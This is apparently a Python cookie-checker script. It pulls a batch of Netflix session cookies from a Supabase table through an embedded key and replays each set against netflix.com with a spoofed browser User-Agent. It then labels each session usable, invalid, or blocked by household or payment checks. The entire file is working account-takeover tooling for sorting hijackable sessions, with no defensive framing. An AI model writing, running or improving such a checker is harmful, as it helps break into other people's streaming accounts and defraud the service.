import requests
import json
import time
import re

SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
}

def analyze_session(session_data):
    try:
        cookies_data = session_data.get('cookies')
        if not cookies_data:
            return "Error: No cookies"

        if isinstance(cookies_data, str):
            cookies_list = json.loads(cookies_data)
        else:
            cookies_list = cookies_data
        
        session = requests.Session()
        session.headers.update(HEADERS)
        
        for cookie in cookies_list:
            session.cookies.set(
                cookie['name'], 
                cookie['value'], 
                domain=cookie.get('domain', '.netflix.com'), 
                path=cookie.get('path', '/')
            )

        # We request browse but follow redirects
        resp = session.get("https://www.netflix.com/browse", timeout=15, allow_redirects=True)
        final_url = resp.url
        html = resp.text.lower()
        
        # Identification Logic
        state = "Unknown"
        if "/browse" in final_url:
            state = "Usable (/browse)"
            # Further check for household on browse page
            if "household" in html or "primary location" in html:
                state = "False Positive: Household Verification (on /browse)"
        elif "/login" in final_url:
            state = "Invalid: Redirected to Login"
        elif "/member" in final_url:
            if "hold" in html or "update" in html or "payment" in html:
                state = "False Positive: Account on Hold / Payment Update"
            else:
                state = "Likely Usable (/member)"
        elif "/YourAccount" in final_url:
            state = "Likely Usable (/YourAccount)"
        elif "household" in html or "primary location" in html:
            state = "False Positive: Household Verification screen"
        elif "choose your plan" in html:
            state = "False Positive: Plan Selection screen"
            
        return {
            "status": state,
            "url": final_url,
            "snippet": f"{resp.text[:500]}..." if len(resp.text) > 500 else resp.text
        }
                
    except Exception as e:
        return {"status": f"Error: {str(e)}", "url": "N/A", "snippet": ""}

def main():
    headers = {
        "apikey": SUPABASE_KEY,
        "Authorization": f"Bearer {SUPABASE_KEY}",
    }
    # Fetch first 30 cookies for diagnostics
    print("Fetching sample of 30 cookies...")
    response = requests.get(f"{SUPABASE_URL}/rest/v1/cookie_sessions?select=*&limit=30", headers=headers)
    if response.status_code != 200:
        print(f"Error: {response.status_code}")
        return
        
    sessions = response.json()
    print(f"Analyzing {len(sessions)} sessions...\n")
    
    analysis_results = []
    
    for i, sess in enumerate(sessions):
        desc = sess.get('description', 'Unknown')
        print(f"[{i+1}/{len(sessions)}] Analyzing {desc[:40]}...")
        result = analyze_session(sess)
        
        status = result["status"]
        if "False Positive" in status:
            color = "\033[93m" # Yellow
        elif "Usable" in status:
            color = "\033[92m" # Green
        else:
            color = "\033[91m" # Red
            
        print(f"  Result: {color}{status}\033[0m")
        print(f"  URL: {result['url']}")
        
        analysis_results.append({
            "desc": desc,
            "result": result
        })
        
        time.sleep(1.5) # Be extra polite during analysis

    print("\n" + "="*50)
    print("ANALYSIS SUMMARY")
    print("="*50)
    
    summary = {}
    for r in analysis_results:
        s = r["result"]["status"]
        summary[s] = summary.get(s, 0) + 1
        
    for state, count in summary.items():
        print(f"{state}: {count}")

if __name__ == "__main__":
    main()
